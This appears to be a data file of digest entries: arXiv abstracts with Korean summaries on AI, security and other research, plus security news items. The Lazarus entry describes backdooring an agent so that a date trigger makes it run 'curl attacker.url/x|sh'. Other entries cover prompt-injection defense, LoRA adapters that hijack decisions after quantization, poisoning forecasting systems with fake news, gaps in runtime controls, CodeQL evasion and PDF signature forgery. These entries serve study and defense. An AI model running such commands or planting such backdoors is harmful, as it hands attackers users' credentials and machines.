cbd9bbb81c13467ff25f8a27.title_ko: AMD, PsiQuantum 투자 추진…CPU·GPU로 양자 오류 수정 협력
cbd9bbb81c13467ff25f8a27.summary_ko: AMD가 PsiQuantum 지분 투자 계획과 기술 협력 확대를 발표했으며, 투자 금액은 공개하지 않았다. 양사는 EPYC CPU·Instinct GPU·ROCm을 활용한 실시간 양자 오류 수정 시스템을 개발할 계획이다. PsiQuantum의 100만 큐비트는 현재 구현한 성능이 아닌 장기 개발 목표다.

726a6f90c5b5ef463d580654.title_original: CapLite: Prompt-Injection Defense for Small Language Model Agents without Model-Written Security Artifacts
726a6f90c5b5ef463d580654.excerpt: arXiv:2611.17115v1 Announce Type: new Abstract: Enforcement defenses against prompt injection, such as CaMeL, Progent, IPIGuard and DRIFT, ask the agent's own model to write a security artifact (a program, a privilege policy, a dependency graph or a constraint list) that code then enforces. We ask whether small language model (SLM) agents can be trusted to write these artifacts. Across 15 open-weight models, 13 of them between 1.7B and 12B parameters, they cannot: the policies, graphs and constraints that the agent's model writes admit attacks on 14 (Progent), 13 (IPIGuard) and 11 (DRIFT) of the models, and CaMeL's programs fail to run in up to 68% of episodes. We present CapLite, which derives its policy from the tool schemas, commits the write calls before any tool result is read, and admits a write only if every argument that decides whom or what it affects is stated in the user's request. This guarantees write integrity: injected text cannot add a write, and no write reaches a recipient, amount, object or destination that the user did not state. No attack succeeds in 13,935 attacked AgentDojo episodes. CapLite reaches utility under attack comparable to CaMeL's (29.0% vs. 27.2%) with fewer tokens than every other enforcement defense and than the undefended agent: 17.1k per episode, 18% of CaMeL's, and the highest utility per token of all enforcement defenses.
726a6f90c5b5ef463d580654.title_ko: CapLite, 소형 언어모델의 보안 정책 작성에 의존하지 않는 프롬프트 주입 방어
726a6f90c5b5ef463d580654.summary_ko: 연구진은 도구 스키마에서 정책을 도출하고 사용자 요청에 명시된 대상에만 쓰기를 허용하는 CapLite를 제안했다. AgentDojo 공격 에피소드 13,935건에서 성공한 공격이 없었으며, 공격 상황의 과제 수행률은 29.0%였다고 보고했다. 에피소드당 토큰 사용량은 1만 7,100개로 CaMeL의 18%였다.
726a6f90c5b5ef463d580654.background_ko: 기존 방어 기법이 소형 언어모델에 작성시킨 보안 정책·그래프·제약에서 공격이 허용되거나 프로그램 실행이 실패하는 문제가 관찰돼 대안을 제안했다.

curation.reason_ko: 연구진이 소형 모델의 정책 작성에 의존하지 않는 CapLite 방어와 공격·과제 수행 평가 결과를 제시했다.

a65c6fc07bb683bb648d1278.title_original: Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents
a65c6fc07bb683bb648d1278.excerpt: arXiv:2611.15118v1 Announce Type: cross Abstract: Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neurons, without model training. Lazarus edits dormant neurons in the model's final feed-forward block, forcing each to promote a payload token through its contribution to the residual stream, when a trigger is present. A $P$-token payload therefore requires about $P$ neurons. The trigger can be an ordinary string appearing anywhere in the agent's context. The edited weights are set in closed form and can be refined in isolation with a few hundred gradient steps. The core insight that dormant neurons can be individually edited and chained to produce a multi-token payload was discovered autonomously by Claude Code with Opus 4.5 in February 2026. On Nemotron-Terminal-8B, seven of 12,000+ neurons, fitted on 23 trigger/no-trigger trajectories, fire the payload on at least 98.8% of triggered test trajectories, with no observed payload leakage on the evaluated benign trajectories. a65c6fc07bb683bb648d1278.summary_ko: 연구진은 모델의 비활성 뉴런 10개 미만을 수정해 특정 문자열에 반응하는 백도어를 심는 Lazarus 기법을 제시했다. Nemotron-Terminal-8B에서는 뉴런 7개를 바꿔 트리거가 있는 시험 경로의 98.8% 이상에서 페이로드가 발동했다고 보고했다. 방어 실험의 탐지율은 91.4%, 오탐률은 9.7%였다.
a65c6fc07bb683bb648d1278.background_ko: AI 에이전트가 높은 시스템 접근 권한으로 장시간 무인 실행되면서, 외부 도입 모델뿐 아니라 내부 개발 모델의 가중치 무결성도 보안 문제로 부상했다.

dbfaad9bf5f20286b013631b.title_original: When Evaluators of AI Agents Disagree: An Empirical Study of Native Scoring, LLM Judges, and Commit-Boundary Checks on tau2-bench
dbfaad9bf5f20286b013631b.excerpt: arXiv:2611.14581v1 Announce Type: cross Abstract: Agentic workflows, in which a large language model (LLM) calls tools to read and write data, are evaluated in two ways. Benchmarks compare the final state against a gold answer. Deployed services have none; an LLM judge reads the transcript and decides. Practice treats the two as interchangeable. This paper measures whether they are. We ran 2,160 episodes in tau2-bench's airline and retail domains and recorded every database write. We scored each episode four ways: native scoring against gold state, an LLM judge, that judge given the policy document, and the boundary evaluator, a minimal rule-based check of whether a write was expected against whether one occurred in the trace. Two annotators independently labeled 120 episodes for task correctness, policy compliance, and commitment correctness. The judge repeated its verdict 98.2% of the time but agreed with native scoring on 56.2%. In 11 episodes the agent executed a forbidden write. The judge passed 10 to 11, with or without the policy or transcript. A stronger judge still passed 6. The boundary evaluator, with no model call, caught all 11; no judge significantly exceeded it on human labels. Forbidden writes occurred in 11.1% of episodes without gates. Verification, correction, and safe-termination gates did not reduce them significantly. dbfaad9bf5f20286b013631b.title_ko: AI 에이전트 평가의 불일치…LLM 심판이 놓친 금지된 쓰기 작업
dbfaad9bf5f20286b013631b.summary_ko: 연구진은 tau2-bench 에피소드 2,160건을 네 가지 방식으로 평가했다. LLM 심판은 자체 판정을 98.2% 재현했지만 정답 상태 기반 채점과의 일치율은 56.2%였다. 금지된 쓰기가 발생한 11건 중 일반 심판은 10~11건을 통과시킨 반면, 규칙 기반 경계 평가기는 모두 탐지했다고 보고했다.
dbfaad9bf5f20286b013631b.background_ko: 정답 상태를 비교하는 벤치마크 채점과 대화 기록을 읽는 LLM 심판 평가가 실무에서 서로 대체 가능한 것으로 취급돼, 실제 일치 여부를 조사했다.

e225d52daae18f1f66cd5b93.title_original: Natural Gradient Learning in Predictive Coding through Lateral Circuits
e225d52daae18f1f66cd5b93.excerpt: arXiv:2611.16666v1 Announce Type: new Abstract: Predictive coding (PC) trains neural networks through local energy-minimization dynamics without depending on a global error signal that backpropagation (BP) requires. Although PC is a promising alternative algorithm for efficient learning, the computational cost of inference dynamics currently outweighs the resulting learning benefits in practice. In this work, we take inspiration from optimization theory to extract more learning benefit from each inference phase. We introduce Natural PC, which augments standard PC with a lateral circuit, enabling exact and efficient natural gradient learning locally in space and time. Our lateral circuit learns the activity correlations that determine the Fisher information matrix and implicitly computes its inverse, avoiding expensive matrix inversion. Across all tested image reconstruction benchmarks, Natural PC achieves state of the art in terms of sample and compute efficiency compared to existing PC approaches. Most notably, Natural PC scales to ImageNet and matches the performance of BP trained with AdamW and various second-order optimizers at an order of magnitude lower computational cost while also using two orders of magnitude fewer training samples. Our results demonstrate that local natural gradient learning makes PC competitive with BP in both sample efficiency and computational cost in reconstruction tasks.
e225d52daae18f1f66cd5b93.title_ko: Natural PC, 측면 회로로 예측 부호화의 자연 기울기 학습 구현
e225d52daae18f1f66cd5b93.summary_ko: 신경망의 예측 부호화에 측면 회로를 더해 자연 기울기를 국소적으로 학습하는 Natural PC가 제안됐다. 연구진은 회로가 Fisher 정보 행렬의 역행렬을 암묵적으로 계산해 직접 역행렬을 구하는 비용을 피한다고 설명했다. ImageNet 재구성에서는 역전파 기반 비교 방식과 비슷한 성능을 내면서 연산 비용은 약 10분의 1, 학습 표본은 약 100분의 1을 사용했다고 보고했다.
e225d52daae18f1f66cd5b93.background_ko: 예측 부호화는 전역 오류 신호 없이 신경망을 학습할 수 있지만, 실제로는 추론 과정의 연산 비용이 학습상 이점을 상쇄하는 한계가 있었다.

curation.reason_ko: Natural PC는 국소적 자연 기울기 학습을 제안했으며 효율 개선 주장은 영상 재구성 과제 범위의 결과다.

caad0bf6809497f60329e3c7.title_original: Anonymous in Name Only: A Critical Review and a Reidentification Exercise on the European Commission's Anonymization Measures for Google Search Data under Article 6(11) of the DMA
caad0bf6809497f60329e3c7.excerpt: arXiv:2611.17012v1 Announce Type: new Abstract: In July 2026, the European Commission (EC) set out the anonymization measures Alphabet must implement to share Google Search data with competing search engines under Article 6(11) of the Digital Markets Act. As the first concrete illustration of how the EC operationalizes anonymization under the EU digital rulebook, this methodology could become a regulatory benchmark. In this paper, we show why it should not. We critically review the anonymization measures proposed by the EC, from the characterization of residual risk to the suppression thresholds and the reliance on contractual safeguards. For each of those issues, we highlight significant conceptual flaws, and, where applicable, we illustrate these flaws with empirical observations from real Google Search data provided by Alphabet and protected under the EC's measures. Importantly, we present examples of low-effort reidentification, record linkage, and confidential attribute inference achieved through straightforward and automatable attack patterns. Our findings show that the approach of the EC relies on unjustified heuristics rather than formal privacy guarantees, underestimates the risks inherent in free-text search queries, and sacrifices data utility without achieving meaningful protection. caad0bf6809497f60329e3c7.title_ko: Google 검색 데이터 익명화 조치의 재식별 위험을 지적한 연구
caad0bf6809497f60329e3c7.summary_ko: 연구진은 유럽연합 집행위원회가 정한 Google 검색 데이터 익명화 조치를 검토하고, 해당 조치로 보호된 실제 데이터에서 재식별·기록 연결·민감 속성 추론 사례를 제시했다. 간단하고 자동화 가능한 공격으로도 보호가 무너진다며, 이 조치가 유럽데이터보호이사회의 세 가지 익명화 기준을 모두 충족하지 못한다고 주장했다.
caad0bf6809497f60329e3c7.background_ko: 유럽연합 집행위원회가 디지털시장법에 따른 경쟁 검색엔진과의 데이터 공유를 위해 Alphabet에 적용할 익명화 조치를 정한 것이 연구 배경이다.

6549d5e335cd01b116d7fcdf.title_original: What You See Is (Not) What You Got: The Human Factor in PDF Signature Verification
6549d5e335cd01b116d7fcdf.excerpt: arXiv:2611.15472v1 Announce Type: new Abstract: Signed PDF documents have legally binding value under frameworks such as the EU's eIDAS regulation. In this work, we present Genuine PDF Forgeries, a novel attack class that focuses on human factors in signature validation. Our attacks target the disconnect between cryptographically verifiable signer certificates and human-visible signature blocks embedded in documents. We analyze our attacks against 23 PDF viewers and validation tools across desktop platforms and the web. We find that nine of the 13 viewers that automatically report signature validity hide authenticated signer information behind additional user interaction. We then evaluate the attack in twin deception-based online studies with 584 EU-based participants. To further validate the impact, we perform a highly tailored real-world attack study with six trials within two privacy-sensitive organizations. Five of six organizational trials accepted requests authenticated using the forged visual identity. In the online studies (total n=584), the most effective attack variant deceives 71.9% of eligible participants on first impression, and 57.3% continue to be deceived even after we prompt for additional introspection. We derive viewer-side countermeasures and prototype a safeguard that overlays the untrusted signature block with signer information obtained from the validated certificate. 6549d5e335cd01b116d7fcdf.summary_ko: 연구진은 인증서의 실제 서명자와 문서에 보이는 서명 신원의 차이를 악용하는 공격을 제시했다. PDF 도구 23개를 분석하고 유럽연합 거주자 584명을 대상으로 실험했다. 가장 효과적인 공격은 첫인상 평가 대상자의 71.9%를 속였으며, 두 조직의 실험에서도 6건 중 5건이 위조된 시각적 신원에 기반한 요청을 수용했다고 보고했다.

1729d832cc47e9e758ff38ca.title_original: Preserve the Vulnerability, Break the Alert: Testing the Robustness of CodeQL Taint Tracking with Natural Rewrites
1729d832cc47e9e758ff38ca.excerpt: arXiv:2611.17123v1 Announce Type: new Abstract: Static application security testing (SAST) tools such as CodeQL serve as security gates in continuous integration and code review, and a gate is also read in reverse. When a previously reported alert disappears after a change, developers and the tools around them often take the vulnerability to be gone. That inference holds only if the analyzer is robust to changes that keep the vulnerability. We test this robustness for CodeQL's JavaScript taint tracking with natural, vulnerability-preserving rewrites. A large language model, given only the alert CodeQL exposes and no knowledge of its implementation, rewrites one function along a reported flow as a plausible maintenance change, and we verify by manual audit and controlled experiments that the flaw survives and the alert does not. On 172 flows that CodeQL detects in real npm vulnerabilities, three rewrites per flow silence 26.2% of them, at about USD 0.51 per silenced flow. The same generator, asked only to refactor the same functions with no knowledge of the alert, silences none of them. Every silencing rewrite traces to one of seven gaps at the library-modeling boundary, and 64 of the 70 rewrites cross a gap inside an API CodeQL already models. The largest is the WHATWG URL constructor, which propagates taint to a URL's query components but not to its pathname. 1729d832cc47e9e758ff38ca.summary_ko: 연구진은 실제 npm 취약점에서 CodeQL이 탐지한 흐름 172개에 취약점을 유지하는 코드 변경을 적용했다. 흐름당 세 차례 변경 시도에서 26.2%의 경고가 사라졌으며, 수동 감사와 통제 실험으로 취약점이 남아 있음을 확인했다고 밝혔다. 경고를 없앤 변경의 원인은 라이브러리 모델링 경계의 일곱 가지 공백으로 분석했다.
1729d832cc47e9e758ff38ca.background_ko: 코드 변경 후 경고가 사라지면 취약점이 해결됐다고 해석하는 관행이 있어, 취약점을 보존하는 변경에도 정적 분석이 탐지를 유지하는지 검증했다.

c3d48d27485c5a8cdd912d8e.title_original: Look Here, Then Decide: Small Decision Models in a Harness Find Memory-Safety Vulnerabilities at Scale on Commodity GPUs
c3d48d27485c5a8cdd912d8e.excerpt: arXiv:2611.16565v1 Announce Type: new Abstract: We ask whether small, open-weight decision models can support vulnerability discovery in open-source software at scale and what the surrounding system must provide. These models answer a typed question in one forward pass, returning scores for the permitted answers rather than text. Our harness selects widely packaged C and C++ projects and uses deterministic incomplete-fix miners and shape localizers to decide where to look. Intern-Decision-4B, a 4B-parameter open-weight decision model, then scores every candidate function. The scores rank the queues rather than accept or reject candidates, apart from a low reach-score floor that some queues kept. The search uses no frontier model. Alone, the model is weak: it separates vulnerable from benign functions with AUC 0.73, but a vulnerable function from its own patch with only 0.56. It is more useful for ordering candidates. On 75 public CVEs from projects without any of our findings, the fixed function reached its repository's top 25 in 21% of cases, 1.4 times as often as under random order of the same queues. Recall is bounded mainly by where the localizers look. On the campaign's own queues the model's order placed 7.5 times more confirmed findings in the top 10 than random order, an observed, selection-biased upper bound. c3d48d27485c5a8cdd912d8e.summary_ko: 연구진은 40억 매개변수의 Intern-Decision-4B로 C·C++ 취약점 후보의 조사 순서를 정하는 시스템을 제시했다. GB10 시스템 3대로 4천 개가 넘는 프로젝트를 탐색해 메모리 안전성 문제 187건을 확인했으며, 유지관리자와 조율하는 공개 절차를 진행 중이라고 밝혔다. 모델 단독 판별에는 한계가 있어 결정론적 분석과 검증이 필수라고 강조했다.

8aeebaa64965919f3344e285.title_original: Hijacking a Trusted LLM in Real-World Quantized Deployments Only Requires a Disguised Adapter
8aeebaa64965919f3344e285.excerpt: arXiv:2611.14978v1 Announce Type: new Abstract: Third-party low-rank adaptation (LoRA) adapters are tailored to perform decision tasks such as content moderation and function selection. However, in the real world, quantized deployments carry a potential threat in that an adapter can pass an audit with the unquantized base, yet hijack decisions when the same base is quantized for deployment. Demonstrating this threat requires an adapter that preserves benign behavior before quantization, but hijacks decisions afterward. Further, this must hold without modifying the trusted base or knowing the victim's quantization configuration. We therefore present QHijack-LoRA, an adapter-only attack that uses the base model's natural quantization residual to activate decision hijacking. The attacker modifies neither the trusted base model nor the victim's quantization configuration. ab01a210ee1f24cea5f1180d.title_original: One Fabrication Is Enough: A Fake News Article Changes the Forecasts of LLM Forecasting Systems
ab01a210ee1f24cea5f1180d.excerpt: arXiv:2611.15102v1 Announce Type: new Abstract: LLMs are increasingly used for forecasting, and the best forecasting systems retrieve news as evidence to strengthen their predictions. We evaluate how far this attack reaches on stock questions and real prediction-market questions. a648f9673761c39640ddd089.title_original: A frontier machine intelligence for human neuroimaging
a648f9673761c39640ddd089.excerpt: arXiv:2611.15094v1 Announce Type: new Abstract: Medical imaging is essential for diagnosing disease, guiding treatment and monitoring patients over time. Although artificial intelligence has advanced image interpretation, existing medical models often address restricted tasks, while general-purpose proprietary models lack access to private clinical imaging required to achieve medical expertise. Developing models that can interpret complex examinations and communicate their findings in the context of clinical decisions remains a major challenge. Here, we show that Neuro-VL, a vision-language model trained on nearly one million neuroimaging studies from routine clinical care, can interpret complete imaging examinations and engage in natural language conversations about their findings. Across internal and international datasets, Neuro-VL outperformed frontier general-purpose and specialized medical models in diagnosing, localizing, and describing abnormalities, as well as generating comprehensive radiology reports. The model also compared serial examinations to assess disease progression and more reliably resisted misleading clinical assumptions than leading frontier models from OpenAI and Google. These results extend health system learning beyond individual predictions to interactive image interpretation and longitudinal disease monitoring. e64e2332008485bff84d2f2b.title_original: Universal Infectious Disease Forecasting with Mantis 2
e64e2332008485bff84d2f2b.excerpt: arXiv:2611.16935v1 Announce Type: new Abstract: Public health agencies need to anticipate how outbreaks will unfold, when they will peak, and how long demand on health services will remain elevated. We previously developed a foundation model, Mantis, which was trained entirely on simulated outbreaks---enabling us to generate the diversity and scale of training data needed to support forecasting across diseases. However, our previous work left unresolved when simulation improves predictions and how it should complement observational data. Here, we varied the balance of simulated and observed training data while holding forecasting tasks fixed and varying the available surveillance history. We found that simulation-rich training was particularly valuable with limited local history, and its relative advantage diminished as more observations became available. We also found that simulation-based training reduced exceptionally large forecast errors, suggesting that mechanistic knowledge can help compensate for limited local evidence. Building on these findings, we developed Mantis 2, which combines simulated and observational training to jointly forecast up to six variables sixteen weeks ahead. Across 30 forecasting tasks, Mantis 2 achieved the best aggregate probabilistic accuracy over short, medium, and long horizons among the machine learning, statistical, and baseline models evaluated. e64e2332008485bff84d2f2b.title_ko: Mantis 2, 시뮬레이션·관측 데이터 결합해 감염병 유행 예측

24b05aeaf6cacbc00116c5f2.title_original: A Cardiorespiratory Foundation Model Pretrained on Ten Physiological Signals for Perioperative and Critical Care
24b05aeaf6cacbc00116c5f2.excerpt: arXiv:2611.15004v1 Announce Type: cross Abstract: Arterial, venous, pulmonary artery and intracranial pressures and ventilator waveforms guide decisions in operating rooms and intensive care units, yet foundation models for physiological waveforms have been built almost entirely on the electrocardiogram and photoplethysmogram. We present CARMEN, a single encoder pretrained without labels on ten cardiorespiratory waveforms (2.27 million modality-hours). CARMEN accepts any combination of co-recorded signals from 10 s to 5 min, and a conditioning mechanism, LSCNorm, restores the absolute signal level that normalization removes; without it, the AUROC for intraoperative hypotension fell from 0.894 to 0.780. Across 19 tasks from Korean and US cohorts, the frozen encoder outperformed supervised models on 12 of 15 and three foundation models, one general-purpose and two for biosignals, on 14 to 17 of 19, with none exceeding it on any task. Given the electrocardiogram or photoplethysmogram alone, it matched or exceeded signal-specific foundation models in most comparisons, and it retained its performance when channels were missing.
24b05aeaf6cacbc00116c5f2.title_ko: 10종 심폐 생리 신호로 사전학습한 의료 파운데이션 모델 CARMEN

72c88a372d5313aa6facd62e.title_original: guardscope: Measuring Which Actions Runtime Controls Check in LLM Agent Systems
72c88a372d5313aa6facd62e.excerpt: arXiv:2611.15223v1 Announce Type: new Abstract: Large-language model (LLM) agents execute actions on external systems through tool calls, and enterprises deploy runtime controls, such as agent gateways, to check this behavior in real time. However, a control can only evaluate the actions that cross the point where it is placed, and an agent can act through more paths than the tool-call channel; no existing work measures this coverage against kernel-level ground truth. In this paper, we present guardscope, a framework that makes this coverage measurable. guardscope works in two stages: a static stage that predicts which of an agent's 15 action paths a control can check from its source, and an empirical stage that runs a fixed workload on a deployment that realizes one of eight topology designs and classifies every executed action as checked, bypassed, or prevented by reconciling the control's decision records against kernel-level ground truth. guardscope makes a control's coverage claim verifiable: a runtime control developer can publish which paths its product inspects under a kernel-verified protocol. We conducted experiments with two agent harnesses and real runtime controls, including Microsoft's agent governance toolkit and agentgateway. guardscope is available at https://github.com/VulcanLab/guardscope.
72c88a372d5313aa6facd62e.title_ko: guardscope, LLM 에이전트 실행 통제의 검사 범위를 커널 기록으로 검증
72c88a372d5313aa6facd62e.summary_ko: 연구진은 LLM 에이전트의 실행 중 보안 통제가 어떤 행동을 검사하는지 측정하는 guardscope를 제안했다. 15개 행동 경로의 정적 분석과 커널 수준 실행 기록 대조를 결합해 각 행동을 검사·우회·차단으로 분류한다. 두 에이전트 실행 프레임워크와 Microsoft의 agent governance toolkit, agentgateway 등을 대상으로 실험했다.
72c88a372d5313aa6facd62e.background_ko: 에이전트는 도구 호출 외의 경로로도 행동할 수 있지만, 실행 통제는 자신이 배치된 지점을 통과하는 행동만 검사할 수 있다.

166cd83fdfdb2f1509f783f8.title_original: Read Once, Answer Many: Parallel Prompting for Shared-Context LLM Inference
166cd83fdfdb2f1509f783f8.excerpt: arXiv:2611.15130v1 Announce Type: cross Abstract: LLM workloads sometimes ask many independent questions about the same long document, as in document QA, data labeling and LLM-based evaluation. Prefix caching removes the redundant prefill shared by these queries, but each decode step still reads the document's key-value (KV) cache once per question, so decoding is bound by memory bandwidth and scales with the number of questions. We present Parallel Prompting, which decodes P questions as P independent streams of a single request all at once, fixing this issue. In our method, every step reads the shared document once for all P streams, and a stream-id attention mask, evaluated inside the attention kernel, keeps each answer conditioned only on the document and its own question. We implement Parallel Prompting in SGLang by adding about 80 lines to three existing files and a small engine package; the mask needs no dense tensor, and every decode step has a fixed shape that is captured as a CUDA graph. With CodeLlama-7B, 8k-16k-token documents and 64-256 questions per document, Parallel Prompting is 3.7x faster than stock SGLang with its FlashInfer backend on an A100 and 5.9-6.0x faster on an RTX A6000, on two SGLang releases, including the most recent release. Timed on identical inputs, it is faster than stock SGLang in all 144 runs (2 GPUs x 2 releases x 6 workloads x 6 input sets). Code: https://github.com/jlab-nlp/parallel-prompting

f8511a052786b35056380766.title_original: AutoAssumption: Searching over Assumptions Discovers ML-Systems Algorithms
f8511a052786b35056380766.excerpt: arXiv:2611.14844v1 Announce Type: new Abstract: Many advances in ML systems came from breaking an assumption that earlier methods took for granted: speculative decoding dropped the assumption that a model needs one forward pass per token. Yet algorithms rarely state their assumptions, so experts and discovery harnesses search over programs, where one edit changes several design choices and gains are difficult to attribute. Searching over the assumptions themselves remains largely unexplored. Writing algorithms as proofs makes their assumptions explicit and turns algorithm design into a search over a small, structured space that an LLM can explore and a proof checker can audit. We formalize 89 algorithms from KV-cache eviction, weight pruning and speculative decoding as proof graphs with explicit assumptions, checked in Lean. Our harness, AutoAssumption, relaxes one assumption of a published method, re-derives and re-proves it, and generates its code. In KV-cache eviction and weight pruning, this search improved on every published algorithm we ran and produced state-of-the-art algorithms. The eviction algorithm has the highest RULER-4K score of the published methods we ran, and the pruning algorithm the lowest perplexity of thirteen on four LLaMA models. At equal budget, the harness scores within a point of OpenEvolve, an open-source implementation of AlphaEvolve, with a lower standard deviation across repeats. Future work will formalize more fields and combine them through th
f8511a052786b35056380766.title_ko: AutoAssumption, 알고리즘의 가정 탐색으로 ML 시스템 설계 자동화

e8edaeeb536a26969cf4d5ee.title_original: Folio: Recoverable Multi-Resolution Context Folding for Long-Horizon Language Agents
e8edaeeb536a26969cf4d5ee.excerpt: arXiv:2611.16627v1 Announce Type: new Abstract: Long-horizon language agents accumulate tool results and replies until the history no longer fits the context window. Current agents shrink this history by having a model summarize it, so each compaction rereads and rewrites the history it replaces, and cache-aware triggers decide when to compact while taking the size of the result as given. We present Folio, a context manager that records, folds, and recovers history through one set of handles. While the agent runs, Folio records three linked levels: a short turn note the model writes as part of its ordinary reply (L1), an event manifest of every call written by the runtime (L2), and the captured source records (L3). Because these views already exist, the runtime folds the context programmatically, selecting coarser views for older turns. The fold prints the handles that index L2 and L3, so recovery tools that read bounded pages, compute over full text in files, and keep findings in a persistent dossier reach the evidence the agent needs with little added input. The fold trigger prices an explicit landing point that includes the retained budget. On 75 LOCA-bench tasks with DeepSeek-V4-Pro behind every system, Folio solves 66 tasks against 54 for the same runtime with model-written compaction and 49-59 for Claude Code, Codex, and SoL-Pi, in about half their working time, at 2.4 times lower cost than that runtime; each fold takes a median of 0.6 seconds.
e8edaeeb536a26969cf4d5ee.title_ko: Folio, 장기 작업 AI 에이전트의 기록을 접고 복원하는 문맥 관리 기법
e8edaeeb536a26969cf4d5ee.summary_ko: 장기 작업용 언어 에이전트의 기록을 세 단계로 저장하고, 오래된 기록은 축약하되 필요하면 원문을 복원하는 Folio가 제안됐다. 연구진은 동일한 DeepSeek-V4-Pro를 사용한 LOCA-bench 75개 과제에서 66개를 해결해, 모델이 기록을 요약하는 동일 실행 환경의 54개를 앞섰다고 보고했다. 문맥 축약 작업의 소요 시간 중앙값은 0.6초였다.

586fae0a6afba99453afb532.title_original: Beyond the Diff - VulSpot: A Vulnerability Dataset Where No Vulnerability Goes Unlocalized
586fae0a6afba99453afb532.excerpt: arXiv:2611.15737v1 Announce Type: new Abstract: A vulnerability detector is only as trustworthy as the benchmark that scores it, and today's real-world datasets tend to flatter detectors. They are often built once and never refreshed, so they quickly miss new vulnerabilities, their labels are either noisy or heavily filtered, and their random splits let models train on near-copies of test code and on future vulnerabilities. Above all, when a fix only adds code, such as a missing NULL check, they do not point at where the vulnerability was, preventing detectors from learning to localize some of the most common C/C++ weaknesses. We present VulSpot, a living benchmark for detecting, classifying, and localizing vulnerabilities, with over 500k functions in 21 languages from 24k registered CVEs, including over 15k vulnerable C/C++ functions. By linking the code added by a patch to the existing statement it protects, VulSpot locates the vulnerability in 99.3\% of the functions that previous diff-based datasets used to leave without a location. Rather than discarding uncertain labels, it tells users how reliable each one is, and it comes with leak-free splits, complementary code context, and hierarchical CWE labels. An automated pipeline refreshes VulSpot every month, so that each release brings vulnerabilities no model has seen yet.
586fae0a6afba99453afb532.title_ko: VulSpot, 코드 추가형 패치에서도 취약점 위치를 찾는 벤치마크 제안
586fae0a6afba99453afb532.summary_ko: 연구진은 21개 언어의 함수 50만 개 이상과 CVE 2만4천 건을 아우르는 취약점 벤치마크 VulSpot을 제안했다. 패치가 추가한 코드를 보호 대상인 기존 구문과 연결해, 기존 차이 기반 데이터셋이 위치를 제시하지 못했던 함수의 99.3%에서 취약점 위치를 찾았다고 보고했다. 라벨 신뢰도와 데이터 누수 방지 분할을 제공하며 매월 자동 갱신한다.
586fae0a6afba99453afb532.background_ko: 기존 취약점 데이터셋에는 갱신 부족과 라벨 오류, 학습·평가 간 데이터 누수 문제가 있으며, 코드만 추가하는 패치에서는 취약점 위치를 표시하지 못하는 한계가 있다.

ccd7629403e249c6b46c7047.background_ko: 메인보드와 화면 사이에 삽입된 악성 기판은 화면의 복구문구와 암호문구를 가로채 이동통신망으로 공격자 서버에 전송하도록 설계됐다.

curation.reason_ko: Trezor가 지갑 3대의 악성 기판을 확인했으며 업데이트로 이미 유출된 복구문구까지 보호할 수는 없다.

739b992f7e2749637e7a4793.title_ko: Quantum Systems 사이버공격 확인…독일군 드론 운용 차질 보도
739b992f7e2749637e7a4793.summary_ko: 독일 드론 업체 Quantum Systems는 10월 말 적대 세력의 사이버공격을 탐지했으며 당국과 대응했다고 밝혔다. Der Spiegel과 Financial Times는 내부 소식통을 인용해 QBase 업데이트 배포 서버를 통한 악성 파일 유포를 보도했다. 독일군이 예방적으로 해당 업체 드론의 운용을 중단했다는 보도도 나왔으나 설치 규모와 공격 주체는 확인되지 않았다.

curation.reason_ko: Quantum Systems가 공격을 확인했고 업데이트 서버 악용과 독일군 드론 운용 중단이 보도됐다.

52f68ff6fc8ee793ee42b527.title_ko: OpenAI, 사용자 승인 기반 에이전트 결제 기능 ChatGPT Wallet 소개
52f68ff6fc8ee793ee42b527.summary_ko: OpenAI가 ChatGPT Wallet을 소개했다. ChatGPT Work, Codex, dots의 에이전트가 사용자 승인을 받아 구매를 완료하며, 기존 카드 보호 장치를 유지하는 방식이라고 설명했다.

curation.reason_ko: OpenAI가 사용자 승인 기반 에이전트 구매 기능을 소개해 AI의 실제 거래 수행 범위를 넓혔다.

7a66db5d444b0450fc88e403.title_ko: llama.cpp·ggml v1.0.0 공개…로컬 AI 생태계의 인터페이스 안정성 강화
7a66db5d444b0450fc88e403.summary_ko: 개발팀은 llama.cpp와 텐서 라이브러리 ggml의 v1.0.0을 공개하고, 향후 API·ABI 비호환 변경을 주 버전 상승으로 명확히 표시하겠다고 밝혔다. llama.cpp는 C/C++ 기반으로 다양한 하드웨어에서 멀티모달 LLM 추론을 지원한다. 팀은 배포 경로 확대와 여러 하드웨어를 아우르는 CI 인프라 강화도 추진한다.
7a66db5d444b0450fc88e403.background_ko: 프로젝트를 활용하는 애플리케이션과 개발자가 늘면서 유연하면서도 안정적인 라이브러리 인터페이스와 명확한 호환성 경계가 중요해졌다.

curation.reason_ko: llama.cpp·ggml 1.0 공개와 API·ABI 변경 원칙은 로컬 AI 제품의 통합·유지보수에 중요하다.

33cc01010db5a5aea891e612.title_ko: Apify, 사이버공격으로 고객 개인정보·저장 데이터 접근 피해 확인
33cc01010db5a5aea891e612.summary_ko: 웹 수집·자동화 기업 Apify는 11월 9~10일 발생한 침입으로 일부 고객의 개인정보와 저장 데이터에 무단 접근이 있었다고 확인했다. 고객이 공개한 통지문에는 비밀번호 해시, 2단계 인증 복구 코드, 로그인 토큰 등도 노출 항목으로 기재됐다. 회사는 내부 비밀정보를 교체하고 일부 OAuth 연결을 해제했으며, 피해 계정 수는 공개하지 않았다.
33cc01010db5a5aea891e612.background_ko: Apify는 공격자가 침해된 인증정보로 추가 인증정보를 확보해 내부 시스템과 관련 고객 계정에 접근했다고 밝혔다.

curation.reason_ko: Apify가 고객 데이터 접근 피해를 확인했으며 공개 통지에는 로그인 토큰과 복구 코드도 포함됐다.

e18c08ddd10218a8f927a3d8.title_ko: Enea, 이동통신망 내부에서 통화·문자 가로채는 SilentAir 활동 보고
e18c08ddd10218a8f927a3d8.summary_ko: Enea는 SilentAir가 최소 아시아 6개국 통신사의 침해된 노드를 이용해 주로 대만을 겨냥한 통화·문자 가로채기를 수행했다고 보고했다. 표적에는 고위 정치·정부 인사가 포함됐으며 가입자 정보 수집과 일부 위치 추적도 관찰됐다. 연구진은 국가급 행위자라는 평가에는 높은 신뢰도를 부여했지만 중국 연계 가능성에 대한 신뢰도는 낮다고 밝혔다.
